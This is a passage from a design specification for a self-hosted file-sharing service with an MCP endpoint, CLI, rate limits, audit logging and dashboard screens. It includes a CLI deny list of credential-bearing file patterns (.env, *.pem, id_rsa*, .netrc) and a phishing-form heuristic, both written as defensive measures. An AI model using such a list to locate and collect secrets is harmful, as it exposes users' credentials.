- Sandboxes where an agent cannot reach an external endpoint but can run a local binary.

So the CLI is not a legacy path. It is the door for anything without an MCP host, and it holds
every capability.

## 9.2 Remote MCP endpoint

Transport: streamable HTTP at `/mcp`, per the current MCP specification, with SSE for
server-to-client messages. Authentication is `Authorization: Bearer shr_…` — the same token as
the HTTP API, with the same scopes.

Client configuration is one object:

```json
{
  "mcpServers": {
    "share": {
      "type": "http",
      "url": "https://share.c52.com/mcp",
      "headers": { "Authorization": "Bearer shr_…" }
    }
  }
}
```

An agent with no token calls any tool and receives a structured error carrying the device-code
instructions from §4.6.2, so it can walk its human through setup without being told how.

## 9.3 Tools

| Tool | Arguments | Returns |
| --- | --- | --- |
| `share_post` | `files: [{path, content \| contentBase64}]`, `name?`, `title?`, `description?`, `tags?`, `entryPath?`, `ttl?`, `note?` | URL, name, seq, kind, warnings |
| `share_request_upload` | `files: [{path, size, sha256, contentType}]`, plus the same metadata | Signed PUT URLs the **agent** uploads to directly. For content too large to pass inline |
| `share_update` | `name`, plus any of `title`, `description`, `tags`, `entryPath`, `ttl`, `pinned` | The artifact |
| `share_list` | `q?`, `tag?`, `kind?`, `shared?`, `trashed?`, `limit?`, `cursor?` | Artifact summaries |
| `share_get` | `name` | Artifact detail including live links |
| `share_read_file` | `name`, `path`, `version?` | File contents (text) or a note that it is binary |
| `share_versions` | `name` | Version list with change counts |
| `share_restore_version` | `name`, `versionId`, `note?` | New version |
| `share_delete` | `name` | Confirmation that it went to the trash |
| `share_restore` | `name` | Confirmation |
| `share_create_link` | `name`, `ttl`, `password?`, `label?` | URL, expiry, generated password once |
| `share_revoke_link` | `linkId` | Confirmation |
| `share_grant` | `name`, `handle`, `note?` | Confirmation |
| `share_whoami` | — | Handle, scopes, quota used and remaining, artifact count |

**`share_post` takes content, not paths.** A remote server cannot read the agent's disk. Small
text files go inline; binary goes base64 up to 8 MB per call. Above that, `share_request_upload`
returns signed URLs the agent PUTs to itself, and the tool's error message says so rather than
failing opaquely.

**The server never fetches a URL supplied by a caller.** There is no "post from this address"
tool, because that would make Share issue outbound requests on behalf of published content —
reintroducing the entire SSRF class that §2.9 says does not exist here, and which §1.6.1 partly
rests on. Bytes always travel from the agent to Share, never the other way. T-MCP-05 asserts
zero outbound sockets during a post.

**Annotations.** `share_create_link` and `share_grant` are marked as having external effects so
hosts that gate such tools prompt the human. `share_delete` is marked destructive but
reversible; `share_post` is marked idempotent-by-name.

**Tool descriptions carry the two things agents get wrong.** Every description of `share_post`
states that posting does not make anything public, and that supplying `title` and `tags` is how
the thing will be found later, because content is never indexed (§8.7).

## 9.4 CLI

```
share post <path> [flags]           Post a file or directory
share ls [flags]                    List artifacts
share get <name>                    Show one
share open <name>                   Print or open the URL
share cat <name> <path>             Print a file from an artifact
share pull <name> [dir]             Download an artifact
share rm <name> [--purge]           Trash, or permanently delete
share restore <name>                Bring back from trash
share versions <name>               List versions
share rollback <name> <seq>         Restore a version
share link <name> [flags]           Create a share link
share links <name>                  List links
share unlink <linkId>               Revoke a link
share grant <name> <handle>         Share with another user
share tag <name> <tag…>             Add or remove tags
share search <query> [flags]        Search
share trash                         List the trash
share login                         Device-code flow, writes credentials
share whoami                        Identity, scopes, quota
share logout                        Remove credentials
share doctor                        Diagnose connectivity, credentials, clock skew
share mcp                           Run a local stdio MCP proxy to the remote endpoint
```

Global flags: `--host`, `--token`, `--json`, `--quiet`, `--no-color`, `--yes`, `--timeout`.

`share mcp` exists for hosts that only speak stdio — it is a thin proxy to the remote endpoint,
not a second implementation.

### 9.4.1 `share post`

```
share post ./calendar
share post ./calendar --name postcal --title "Q4 posting calendar" --tag social
share post report.pdf
share post ./dist --ttl 30d
share post ./calendar --link --link-ttl 14d --password
```

| Flag | Effect |
| --- | --- |
| `--name` | Address to post at; creates or overwrites |
| `--title`, `--description` | Explicit metadata |
| `--tag` | Repeatable |
| `--entry` | Which file answers at the root |
| `--ttl` | Artifact self-trashes after this |
| `--note` | Version note |
| `--link` | Create a share link after posting; requires `share:create` |
| `--link-ttl`, `--password`, `--label` | Link options |
| `--include` / `--exclude` | Repeatable globs |
| `--dry-run` | Print the manifest and what would upload; change nothing |
| `--bundle` / `--no-bundle` | Force or forbid the one-shot path |
| `--concurrency` | Upload workers; default 8, or 4 when any file exceeds 100 MB |
| `--json` | Emit the commit response and nothing else |

### 9.4.2 Local walk rules

Always excluded, regardless of flags:

```
.git/ .hg/ .svn/ node_modules/ __pycache__/ .venv/ venv/ .mypy_cache/ .pytest_cache/
.terraform/ .next/cache/ .parcel-cache/ .idea/ .vscode/ .DS_Store Thumbs.db *.pyc
```

Refused **loudly**, requiring `--force-secrets` to proceed:

```
.env  .env.*  *.pem  *.key  id_rsa*  *.p12  *.keystore  credentials  .netrc
```

The server rejects dotfiles anyway (§6.4), but the point is to fail in the operator's own
terminal, naming the file, before anything leaves the machine.

Symlinks are skipped with a warning, never followed. Unreadable files are a hard error naming
the file.

### 9.4.3 Output

Terse, ending with the URL on its own line so `$(share post ./x | tail -1)` works:

```
Posting ./calendar  (3 files, 110 KB)
  1 new, 2 unchanged
  ████████████████████ 1/1 uploaded
Posted postcal v2 — private

https://share.c52.com/postcal
```

`--json` emits exactly the commit response body. Warnings go to stderr with a `warning:` prefix.
Errors print `error: <code>: <message>` and exit per §9.7.

## 9.5 Credentials and configuration

```
~/.share/credentials      mode 0600, one line: the token
~/.share/config.json      { "host": "https://share.c52.com", "concurrency": 8 }
./.share.json             per-project overrides (excluded from any walk)
```

Resolution for every setting: flag → environment (`SHARE_TOKEN`, `SHARE_HOST`) → project config
→ user config → default.

`share login` runs the device-code flow of §4.6.2: it prints a short user code and a URL, the
human approves in an authenticated session, and the CLI writes the token with mode `0600` and
prints the granted scopes — including, plainly, that the token cannot create share links.

## 9.6 What the agent surface says about privacy

Three places repeat the same fact, because the failure mode is an agent assuming that posting
means publishing:

1. `share post` output: `Posted postcal v2 — private`.
2. The `share_post` tool description, first sentence.
3. `share whoami`: `scopes: artifacts:read artifacts:write  (cannot create share links)`.

And the inverse: `share link` always prints the expiry in absolute terms —
`Public until 2026-09-07 18:04 UTC (14 days)` — so an agent transcript shows exactly what
became reachable and for how long.

## 9.7 Exit codes

| Code | Meaning |
| --- | --- |
| 0 | Success |
| 1 | Generic failure |
| 2 | Usage error |
| 3 | No credentials |
| 4 | Authentication failed |
| 5 | Insufficient scope |
| 6 | Not found |
| 7 | Conflict |
| 8 | Quota or size limit |
| 9 | Rate limited |
| 10 | Host unreachable |
| 11 | Refused locally (secret file, symlink, unreadable file) |
| 12 | Server error |

With `--json`, every failure emits the §5.1.1 error envelope on stdout so a wrapper can branch
on `error.code` without scraping text.

## 9.8 Discovery and installation

```
https://share.c52.com/.well-known/mcp                 → endpoint descriptor
https://share.c52.com/install.sh                      → CLI installer
https://share.c52.com/~/help/agents                   → copy-paste setup for each host
```

The help page carries ready-made configuration blocks for Claude Code, Cursor, Codex, Cline,
and a generic MCP host, each with the user's own hostname already filled in and a placeholder
where the token goes. `install.sh` installs the CLI, writes `~/.share/config.json` pointing at
the instance it came from, and offers to run `share login`. It never writes a credential it was
not given interactively.

## 9.9 CI use

- `SHARE_TOKEN` from the runner's secret store; never a credentials file in CI.
- `--yes` suppresses prompts; without it, a confirmation in a non-TTY is an error rather than a
  silent assumption.
- The documented pattern is `share post ./out --name preview-$BRANCH --ttl 30d`, giving each
  branch a stable private URL that cleans itself up. **`--link` from CI is discouraged in the
  docs** — a pipeline that can publish to the internet is a pipeline whose compromise publishes
  to the internet.

---

# Part 10 — Limits, Audit, and Notifications

## 10.1 Why each limit exists

| Reason | Response shape | Example |
| --- | --- | --- |
| **Protect the host** — a loop must not fill the disk | Hard failure, clear error, owner email | Storage quota |
| **Protect the owner** — a compromised token must not do unbounded damage quietly | Hard failure plus an audit event and a notification | Share-link creation rate |
| **Protect a public surface** — a stranger must not brute-force a gate | Throttle with `Retry-After` | Share-link password attempts |

None exists to sell an upgrade. Every ceiling is configurable by the operator.

## 10.2 Rate limits

Redis token buckets keyed `sh:rl:{bucket}:{subject}`, refilled continuously so a burst is fine
and a sustained rate is not. Every throttled response carries `Retry-After`,
`X-RateLimit-Limit`, `X-RateLimit-Remaining`, and `X-RateLimit-Reset`, and names the bucket in
`detail.bucket`.

### 10.2.1 API

| Bucket | Subject | Limit | Burst |
| --- | --- | --- | --- |
| `api` | token | 600 / min | 100 |
| `api_ip` | IP | 1,200 / min | 200 |
| `post` | user | 240 / hour | 30 |
| `post_token` | token | 120 / hour | 20 |
| `upload` | upload session | 16 concurrent | — |
| `bundle` | user | 120 / hour | 20 |
| **`link_create`** | user | **20 / hour** | 5 |
| `grant` | user | 60 / hour | 10 |
| `search` | user | 300 / hour | 60 |
| `invite` | user | 10 / day | 3 |
| `copy` | user | 120 / hour | 20 |

`link_create` is deliberately tight. Twenty share links an hour is far above any human workflow
and far below what a compromised agent would want. Exhausting it fires an immediate owner
notification as well as returning `429`.

### 10.2.2 Authentication

| Bucket | Subject | Limit |
| --- | --- | --- |
| `webauthn_begin` | IP | 20 / 10 min |
| `webauthn_finish` | IP | 10 / 10 min |
| `token_auth_fail` | IP | 30 / hour, then 1 / min |
| `device_start` | IP | 10 / hour |
| `device_poll` | device code | 1 per `interval` seconds |
| `recovery_use` | email | 5 / hour |
| `recovery_use_ip` | IP | 20 / day |
| `link_password` | IP + link | 10 / hour |
| `link_password_link` | link | 50 / hour |

`link_password_link` is the one that matters: without a per-link ceiling, a distributed attempt
against a 24-bit generated password would eventually succeed. Fifty attempts an hour against
sixteen million possibilities is effectively never, and the owner is emailed the first time a
link's bucket is exhausted.

### 10.2.3 Serving

| Bucket | Subject | Limit |
| --- | --- | --- |
| `serve_ip` | IP + artifact | 600 / min |
| `serve_link` | share link | 3,000 / hour |

Static assets are not otherwise limited — one page load fetches dozens of files and must not
trip anything. Signed-in owners get ten times the serving limits; hammering your own dashboard
is not an attack.

## 10.3 Storage quotas

| Level | Default | Checked at |
| --- | --- | --- |
| Per user | 500 GB | Declare and commit |
| Per artifact version | 10 GB | Commit |
| Per file | 5 GB | Upload |
| Files per version | 5,000 | Declare |
| Bundle upload | 200 MB compressed / 800 MB expanded | Bundle endpoint |

These are generous on purpose. Video is in scope, multi-file bundles are the main event, and a
ceiling that a chart-heavy report can hit is a ceiling that makes the tool annoying. The
binding constraint should be the disk the operator bought, not a number in a config file.

Quota is checked at declare time so a post fails **before** bytes move, with `currentBytes`,
`projectedBytes`, and `quotaBytes` in `detail` — an agent can then report something actionable
rather than "upload failed". It is checked again at commit.

Warnings at 80% and 95%, by email, at most daily. At 100%, posting fails but reading, sharing,
and **deleting** continue — someone over quota must always be able to dig out.

## 10.4 Anomaly detection

Cheap heuristics run every 15 minutes. None blocks anything; each produces an owner email and a
dashboard banner.

| Signal | Threshold | Why |
| --- | --- | --- |
| Share links created in an hour | > 5 | A token making links repeatedly is a script or a problem |
| First link ever created by a token | any | The first time a given agent puts something within reach of the internet, the owner hears about it |
| Bytes posted in an hour by one token | > 10 GB | Bulk shape |
| Artifacts created in an hour by one token | > 100 | Runaway loop |
| Artifacts trashed in an hour by one token | > 50 | Runaway loop, the destructive direction |
| Token used from a new source IP | any | The token is in use somewhere new |
| Recovery code used | any | Always |
| Passkey signature counter regression | any | Possible cloned authenticator |

The trash-rate signal is the one that pairs with full agent CRUD: an agent deleting fifty things
in an hour is either doing exactly what it was asked or having a very bad day, and the owner
should find out within fifteen minutes either way rather than next Tuesday.

## 10.5 Abuse surface

The operator and their invited users are the only publishers, so there is no moderation
problem. Two real risks remain, both about the domain's reputation:

1. A shared link pointing at something that looks like phishing — an agent asked to mock up a
   login page, then shared — could eventually get `c52.com` flagged, taking everything else on
   the domain with it.
2. A share link used as a file drop by something that got hold of a token.

Mitigations, in order of usefulness:

- Sharing is rare, deliberate, expiring, scoped away from agent tokens by default, and notified.
- `X-Robots-Tag: noindex, nofollow` on everything, and a deny-all `robots.txt` with no override
  (§6.7). Nothing here reaches a search index.
- A post-time heuristic **warns, never blocks**, when a page contains a password input inside a
  form posting off-origin. Advisory, deliberately unclever, and the owner is the only reader.
- `sharectl panic` revokes every share link on the instance, kills every recipient session, and
  emails a summary. One command, for the morning something looks wrong. It deliberately does
  **not** revoke grants: a grant is not forwardable, its holder is a known user of the instance,
  and revocation is irreversible. The summary email enumerates every live grant so the operator
  can act on them individually.

## 10.6 View counting

Every artifact response emits an event to a Redis stream: artifact, source (`owner`, `grant`,
`link`), link ID, byte count, and a salted daily hash of the client address. The worker flushes
every 60 seconds into `view_daily`, with a HyperLogLog per (artifact, day, source) for the
distinct-viewer estimate.

**No raw view row is ever written to disk.** P6 is true by construction rather than by a
retention policy — there is no raw data whose expiry could be misconfigured. The salt is derived
per day, so yesterday's hashes cannot be recomputed once the day rolls over, and the same
visitor across two artifacts produces unlinkable hashes.

What the owner sees: view counts, viewer estimates, dates, and which link was used. What nobody
can see, including the operator with database access: who, or from where.

## 10.7 Audit log

### Recorded actions

| Domain | Actions |
| --- | --- |
| Auth | `auth.signin`, `auth.signin_failed`, `auth.signout`, `auth.session_revoke`, `auth.recovery_used`, `auth.session_granted`, `auth.counter_regressed` |
| Passkeys | `passkey.register`, `passkey.revoke`, `passkey.rename` |
| Tokens | `token.create`, `token.revoke`, `token.scope_change`, `token.device_authorize` |
| Artifacts | `artifact.post`, `artifact.overwrite`, `artifact.rename`, `artifact.metadata`, `artifact.trash`, `artifact.restore`, `artifact.purge`, `artifact.copy`, `artifact.ttl_expired` |
| Versions | `version.restore`, `version.delete`, `version.pin` |
| **Sharing** | `link.create`, `link.update`, `link.revoke`, `link.expired`, `link.password_change`, `grant.create`, `grant.revoke`, `recipient.unlock`, `recipient.unlock_failed` |
| Users | `user.create`, `user.invite`, `user.disable`, `user.settings` |
| System | `system.collect`, `system.trash_empty`, `system.backup`, `system.quota_warning`, `system.panic` |

Every record carries actor type and ID, token ID where applicable, source IP, user agent,
target type/ID/label, and action-specific metadata.

### The sharing records

`link.create` metadata is the most important row in the system:

```json
{ "artifact": "postcal", "artifactId": "art_01JAV…",
  "expiresAt": "2026-09-07T18:04:00Z", "ttl": "14d",
  "hasPassword": true, "label": "Fairfield listing team",
  "url": "https://share.c52.com/s/9fq2n4kw…", "maxViews": null }
```

That is what makes P3 checkable after the fact: for any window of time, the owner can answer
"what of mine was reachable without a sign-in, when, and by whose doing".

### Reading it

```
GET /api/v1/audit?action=link.&from=2026-08-01&to=2026-08-31&tokenId=shr_…&limit=100
GET /api/v1/audit/export?from=…&to=…&format=ndjson
```

`action` accepts an exact value or a prefix (`link.` catches every sharing action). Other
filters: `actorType`, `tokenId`, `targetId`, `ip`, free text on `target_label`. A user sees
their own events; the root user may pass `scope=instance`.

Integrity: the application role has `INSERT, SELECT` only. Backups include the table.
`sharectl audit-seal` optionally writes a daily SHA-256 digest of the day's ordered rows to an
append-only file outside the database, verifiable later with `sharectl audit-verify`. Off by
default.

## 10.8 Notifications

Separate from both logs — things the owner is told without asking. Templates in §12.9.

| Trigger | Default | Notes |
| --- | --- | --- |
| A share link was created | **on** | Immediately. Names the artifact, expiry, and whether a password was set |
| A link expires in 24 hours | on | With a one-click extend |
| A link expired | on | |
| An artifact with live shares expires in 24 hours | on | |
| Over 80% / 95% of quota | on | At most daily |
| An API token was created | on | |
| A token created its first-ever share link | on | §10.4 |
| Unusual link-creation rate | on | §10.4 |
| Unusual trash rate | on | §10.4 |
| A recovery code was used | on | Cannot be disabled |
| Passkey counter regression | on | Cannot be disabled |
| Repeated auth failures from one IP | on | Hourly at most |
| Backup failed | on | Instance-level, to the root user |
| Disk over 85% | on | Instance-level |

The two that cannot be disabled are the two that mean someone may be getting in. Everything
else is per-user in settings.

## 10.9 Error codes

| HTTP | Code | Meaning |
| --- | --- | --- |
| 413 | `quota_exceeded` | User storage limit |
| 413 | `artifact_too_large` | One version over the ceiling |
| 413 | `file_too_large` | One file over the ceiling |
| 413 | `too_many_files` | Over the per-version count |
| 429 | `rate_limited` | Any bucket; `detail.bucket` names it |
| 507 | `disk_full` | Instance out of disk; posting refused, serving continues |

---

# Part 11 — Every Screen and State

## 11.0 How to read this part

Screen numbers are fixed by `inventory.md` and are the join key between this part, the copy in
Part 12, and the design system in Part 13. Where an earlier part cites a screen number that
disagrees with the inventory, **the inventory wins** — §8.4's reference to "the trash screen
(§11.13)" means 11.15.

Three facts shape every screen here and are not restated in each one:

1. **The dashboard is a signed-in JavaScript application** served from `/~/*`, talking to
   `/api/v1/*` with the session cookie and the `X-Share-CSRF` header (§4.4). It has no
   server-rendered fallback and does not need one.
2. **R1–R7 are server-rendered HTML with inline CSS and no JavaScript at all.** They are
   emitted by the API (or by Caddy, for R6) and never load the dashboard bundle. R1 in
   particular must submit a form with scripting disabled (§7.4).
3. **Nothing on any screen is derived from file contents.** No generated titles, no summaries,
   no thumbnails, no previews rendered from parsing. An artifact with no `title` displays its
   `name` in the title position, in the same weight, with no placeholder text and no guess
   (P5). The only "preview" anywhere is the artifact's own bytes rendered in an iframe or a
   native element by the browser.

### 11.0.1 Vocabulary used by every screen

| Term on screen | Source |
| --- | --- |
| **Sharing state** | `artifact.visibility` plus `artifact.shareLinks[]` (§7.8) |
| **Posted by** | `artifact.createdBy` — `{type:'token'|'user', id, name}` |
| **Version** | `artifact.seq`, `versionCount` |
| **Expires** | Always an absolute UTC timestamp, with a relative hint in parentheses |

---

## 11.1 — Sign in — passkey

- **Purpose** — Get a returning user into the dashboard with one authenticator tap and nothing typed.
- **Route** — `/~/signin`. Any unauthenticated `/~/*` request redirects here with `?next=` holding the original path.
- **Entry points** — Typing the host; a bookmark; expiry of a session (`401 session_expired`); the "Sign in" link on R4 is deliberately absent — R4 reveals nothing.
- **Permissions** — Public. An already-authenticated visitor is redirected to `?next=` or `/~/artifacts` without rendering.
- **Layout** — Single centred column, max 380px, vertically centred, no chrome: no sidebar, no top bar. Wordmark, one line of copy, the primary button, then a single small link row. Nothing below the fold at any viewport ≥ 480px tall.
- **Components**
  - Wordmark and hostname (`share.c52.com`, from the served origin — not configurable client-side).
  - **Sign in** button — calls `POST /auth/passkey/login/begin` with an empty body, passes `publicKey` to `navigator.credentials.get()`, posts the assertion to `POST /auth/passkey/login/finish`. `allowCredentials` is empty, so the browser offers whichever discoverable credential matches (§4.3).
  - Link: **Use a recovery code** → 11.2.
  - No email field. No "remember me" — the session is 30 days sliding by default (§4.4).
- **States**
  - *Idle* — button enabled.
  - *Ceremony in progress* — button shows a spinner and is disabled; the browser's own passkey sheet is the primary feedback. A 120-second timeout matches `timeout: 120000`.
  - *Cancelled* (`NotAllowedError` / `AbortError`) — return to idle silently, no error text. A user who dismissed the sheet knows they dismissed it.
  - *Failed* — `401 invalid_credential` or `401 webauthn_verification_failed` → one inline error above the button (§12.5), button re-enabled.
  - *Counter regressed* — `401 credential_counter_regressed` → a distinct, more serious message stating the owner has been emailed; the recovery link is emphasised.
  - *Rate limited* — `429` on `webauthn_begin`/`webauthn_finish` → the button disables with a countdown from `Retry-After`.
  - *No passkey on this device* — the browser reports no credential; show the recovery-code link plus one sentence pointing at 11.3 on a device that has one.
- **Interactions** — Success sets `share_s` and `share_csrf` and navigates to `?next=` when it is a same-origin `/~/` path, otherwise `/~/artifacts`. An open-redirect check on `next` is mandatory: reject anything not matching `^/~/`.
- **Copy references** — §12.5 (11.1), §12.8 for the auth codes.

---

## 11.2 — Sign in — recovery code

- **Purpose** — Let a user who has lost every passkey get one 30-minute session whose only job is registering a new passkey.
- **Route** — `/~/signin/recovery`
- **Entry points** — The link on 11.1. Never linked from inside the app.
- **Permissions** — Public.
- **Layout** — Same centred column as 11.1. Two fields stacked (email, recovery code), a primary button, a back link, and a short paragraph explaining what happens next — this screen is used once every few years and must explain itself in place rather than in a help page.
- **Components**
  - Email field — `type="email"`, autocomplete `username`.
  - Code field — 24 characters, Crockford base32, monospace, auto-uppercased and stripped of spaces and hyphens on input; a submitted value is normalised client-side before `POST /auth/recovery/use`.
  - Advisory: using a code invalidates all others and issues a fresh one, shown *before* submission, not after.
- **States**
  - *Invalid* — `401` returns a single message that does not distinguish a wrong email from a wrong code.
  - *Rate limited* — `recovery_use` (5/hour/email) or `recovery_use_ip` (20/day/IP) → countdown from `Retry-After`.
  - *Success* — navigate straight to 11.3 in **forced mode**, with the new recovery code presented there once.
- **Interactions** — The session created here is restricted server-side to registering and listing passkeys. The dashboard reflects that: the app shell renders in a reduced form with the sidebar suppressed and every other route redirecting back to 11.3 until a passkey is registered. A visible strip states the session ends at an absolute time.
- **Copy references** — §12.5 (11.2), §12.9 `recovery_used`.

---

## 11.3 — Passkey registration / add a passkey

- **Purpose** — Register a WebAuthn credential, either as an addition from the security screen or as the forced step after recovery or invite acceptance.
- **Route** — `/~/security/passkeys/new`
- **Entry points** — **Add a passkey** on 11.19; the forced redirect from 11.2 and 11.4; the first-run checklist item on 11.6.
- **Permissions** — Any session, including a recovery-restricted one. No token can reach this — it is a browser ceremony.
- **Layout** — Centred card, max 480px. In forced mode the card sits on the bare page (no shell); in additive mode it renders as a modal dialog over 11.19 with the URL updated, so a refresh keeps the dialog.
- **Components**
  - **Register** button — `POST /auth/passkey/register/begin` → `navigator.credentials.create()` → `POST /auth/passkey/register/finish` with `{credential, name}`.
  - Name field, pre-filled from the AAGUID lookup ("1Password", "MacBook Touch ID") and editable before or after registration (§4.2).
  - In forced-after-recovery mode only: the freshly issued recovery code in a monospace block with a **Copy** control and a "shown once" line, plus a checkbox — *I have saved this code* — gating the finish button.
  - Existing credential list, read-only, from `GET /api/v1/auth/passkeys`, so the user does not register a duplicate authenticator by mistake.
- **States**
  - *Already registered* — `excludeCredentials` causes `InvalidStateError`; show "this authenticator is already registered" and name the matching credential.
  - *Cancelled* — silent return to idle.
  - *Second-key nudge* — when this is the user's first and only passkey after success, the screen does not dismiss; it repeats the prompt to add a second and offers **Do this later**, which is what closes the first-run checklist item (§4.2).
- **Interactions** — Success in additive mode closes the dialog, toasts, and prepends the new credential to 11.19's list optimistically using the `201` body. Success in forced mode navigates to `/~/artifacts`.
- **Copy references** — §12.5 (11.3), §12.3 for the checklist line.

---

## 11.4 — Invite acceptance

- **Purpose** — Turn an invite token into a user with a passkey and an empty space.
- **Route** — `/~/invite/{token}`
- **Entry points** — The emailed link only (§12.9 `invite`).
- **Permissions** — Public, gated by the token. A signed-in user opening someone else's invite sees an explanatory screen and a **Sign out and continue** action — silently binding an invite to the wrong session is worse than an extra click.
- **Layout** — Centred column. Who invited you, the handle you are about to claim, the space you will get (`share.c52.com/~sarah`), then the register button. The handle is shown as fixed text, not a field: it was claimed at invite time (§4.8).
- **Components** — Inviter display name and the target handle from `GET /api/v1/invites/{token}` (public, token-gated, returns only inviter name, handle, email, `expiresAt`); a display-name field, optional; the passkey ceremony inline (the same component as 11.3); the recovery code presented once on success with a copy control and a save-confirmation checkbox.
- **States**
  - *Expired* — `410 invite_expired` → a terminal card telling them to ask for a new invite. No retry control.
  - *Revoked or already accepted* — `404` → the same terminal card. The two are not distinguished.
  - *Handle now taken* — cannot happen (handles are claimed at invite time); if the API returns `409` anyway, show the generic failure and instruct them to contact the person who invited them.
- **Interactions** — Success creates the user, establishes a session, and lands on 11.6 with the first-run checklist for a non-root user (no "invite someone" item).
- **Copy references** — §12.5 (11.4).

---

## 11.5 — Home — artifact list

- **Purpose** — The default screen: everything the user owns, newest activity first, with each row stating its sharing state.
- **Route** — `/~/artifacts`. Filter and sort state lives in the query string (`?q=&tag=&kind=&sort=&hasLink=&token=`), so a filtered view is linkable and survives a refresh.
- **Entry points** — Sign-in landing; the wordmark; **Artifacts** in the sidebar; `Esc` from most sub-screens.
- **Permissions** — Any session. Shows only the caller's own space (§5.2) — there is no cross-space listing for anyone, including root.
- **Layout** — App shell (11.29.1) with the sidebar at left. Main column top to bottom: advisory banner stack, filter bar, table, pagination footer. Above the fold at 1280×800: banners, filter bar, and roughly twelve rows. The table is the only scrolling region on wide viewports; the page scrolls as a whole below 900px.

```
┌──────────────┬────────────────────────────────────────────────────────────────┐
│ Share        │  [ Search artifacts            ⌘K ]        [ Upload ]   (RM)   │
│              ├────────────────────────────────────────────────────────────────┤
│ LIBRARY      │  ⚠ 2 share links expire within 48 hours          Review        │
│ ▸ Artifacts  │  ⚠ postcal expires 26 Aug 2026, 09:00 UTC (in 2 days) Extend   │
│   Shared     ├────────────────────────────────────────────────────────────────┤
│   Trash      │  All ▾   Kind ▾   Tag ▾   Agent ▾   Shared ▾   Sort: Updated ▾ │
│              ├────────────────────────────────────────────────────────────────┤
│ AGENTS       │  NAME                 SHARING            UPDATED   SIZE  v     │
│   Tokens     │  ─────────────────────────────────────────────────────────────  │
│   Audit log  │  ▣ postcal            ◆ Link active      2h ago    110 KB  v2  │
│              │    Q4 posting calendar  expires 7 Sep 2026, 18:04 UTC          │
│ ──────────── │    bundle · grokbot@hosta                              ⋯     │
│ ▓▓▓░░ 41 GB  │  ─────────────────────────────────────────────────────────────  │
│  of 500 GB   │  ▤ q3/market-report   ● Shared with 2    1d ago    2.4 MB  v5  │
│ (RM) robert  │    document · claude-code@hosta                        ⋯     │
│              │  ─────────────────────────────────────────────────────────────  │
│              │  ▦ hero-render        ○ Private          3d ago    18 MB   v1  │
│              │    image · uploaded by you                              ⋯     │
│              ├────────────────────────────────────────────────────────────────┤
│              │  50 of 218                                   [ Load more ]     │
└──────────────┴────────────────────────────────────────────────────────────────┘
```

- **Components**
  | Element | Source |
  | --- | --- |
  | Rows | `GET /api/v1/artifacts?limit=50&sort=updated_desc` → `items[]` |
  | Kind glyph | `item.kind` (`bundle`/`page`/`document`/`image`/`video`/`file`) — a glyph per kind from §13, never a rendered thumbnail |
  | Name | `item.name`, monospace. Primary link to 11.7 |
  | Title line | `item.title`; **omitted entirely when null** — no placeholder, no guess |
  | Sharing state | The 11.29.2 component, from `item.visibility` + `item.shareLinks[]` |
  | Updated | `item.updatedAt`, relative, `title` attribute carrying the absolute UTC value |
  | Size | `item.totalBytes`, formatted |
  | Version | `v{item.seq}`; a link to 11.10 when `versionCount > 1` |
  | Agent | `item.createdBy.name` with a token glyph when `type === 'token'`, "you" when `type === 'user'`. Clicking it filters the list by `?token={id}` |
  | Pin | `item.pinned` — pinned rows sort above everything else within the current sort |
  | Row menu `⋯` | Open · Copy URL · Share… (11.12) · Versions · Rename · Move to trash |
  | Banners | Links within 48 h of expiry from `GET /api/v1/artifacts?hasLink=true` (§7.5); artifacts within 24 h of `ttlExpiresAt`; quota at 80/95/100% from `GET /api/v1/status`; anomaly notices from §10.4 |
  | Filter bar | Kind, tag (`GET /api/v1/tags`), agent token (`GET /api/v1/tokens`), sharing (`hasLink=true` / private only), sort |
- **States**
  - *Loading* — eight skeleton rows with the real column widths (11.29.11). Never a spinner: the table's shape is known before the data arrives.
  - *Empty (no artifacts at all)* — 11.6 replaces this screen entirely.
  - *Empty (filters applied)* — an in-table empty row: what was filtered, and **Clear filters**. The filter bar stays.
  - *Error* — the table region is replaced by the 11.29.10 error block with **Retry**; banners and filters remain interactive.
  - *Over quota* — a persistent red banner: posting is refused, reading and deleting still work (§10.3). Links to 11.25 and 11.15.
  - *Link expiring soon* — amber banner naming the count, expanding to a list on **Review**, each row offering **Extend** (`PATCH /api/v1/links/{id}` with `ttl`) inline.
  - *TTL approaching* — amber banner per artifact within 24 h, with **Keep** (`PATCH /api/v1/artifacts/{name}` `{"ttl":null}`) and **Dismiss**.
  - *Stale-artifact nudge* — when `GET /api/v1/status` reports a stale count, a low-emphasis line at the foot of the list linking to 11.24. Never a banner; it is not urgent.
- **Interactions**
  - Row click → 11.7. `⌘`/`Ctrl`-click and middle-click open in a new tab (rows are real `<a>` elements).
  - **Copy URL** copies `item.url`, toasts "URL copied". This is the artifact's signed-in address, not a share link — the toast says so, because handing that URL to a client is the single most likely user error in the product.
  - **Move to trash** → destructive confirm (11.29.6) naming the 30-day window and warning that live links and grants are revoked immediately and are *not* restored on restore (§5.11). On confirm: optimistic row removal, `DELETE /api/v1/artifacts/{name}`, toast with **Undo** for 10 seconds calling `POST …/restore`. On failure, the row returns to its position with an error toast.
  - Multi-select via row checkboxes (revealed on hover and always visible once one is checked) enables bulk **Move to trash** only. No bulk share, ever — see 11.13's rationale.
  - **Load more** appends using `nextCursor`. No page numbers (11.29.4).
  - Sort or filter change rewrites the query string and refetches from a null cursor.
- **Copy references** — §12.5 (11.5), §12.6 for banner text.

---

## 11.6 — Home — empty state and first-run checklist

- **Purpose** — Turn a brand-new account into one with an agent posting to it, without the user reading documentation.
- **Route** — `/~/artifacts`, rendered instead of the table when `items.length === 0 && no filters applied`.
- **Entry points** — First sign-in; after emptying an account.
- **Permissions** — Any session. The root user's checklist has an invite item; other users' does not.
- **Layout** — Two stacked blocks in the main column: the checklist card (max 640px), then a quiet "nothing here yet" block below it. The checklist is above the fold; it is the point of the screen.
- **Components**
  - Checklist items, each with a state icon, one line of copy (§12.3), and one action:
    | # | Item | Done when |
    | --- | --- | --- |
    | 1 | Connect an agent — shows the MCP JSON block with this host filled in and a **Create a token** button → 11.18 | `GET /api/v1/tokens` returns ≥ 1 live token |
    | 2 | Post something — the exact `share_post` call and the `share post ./dir` equivalent | `artifact_count > 0` |
    | 3 | Add a second passkey → 11.3 | ≥ 2 live passkeys, or explicitly dismissed |
    | 4 | *(root only)* Invite someone → 11.22 | ≥ 1 invite sent, or dismissed |
  - Checklist completion is stored in `settings.firstRun` via `PATCH /api/v1/settings`; dismissal is per item and the card disappears when all items are done or dismissed.
  - **Upload from your browser** as a secondary action → 11.17, for a user with no agent yet.
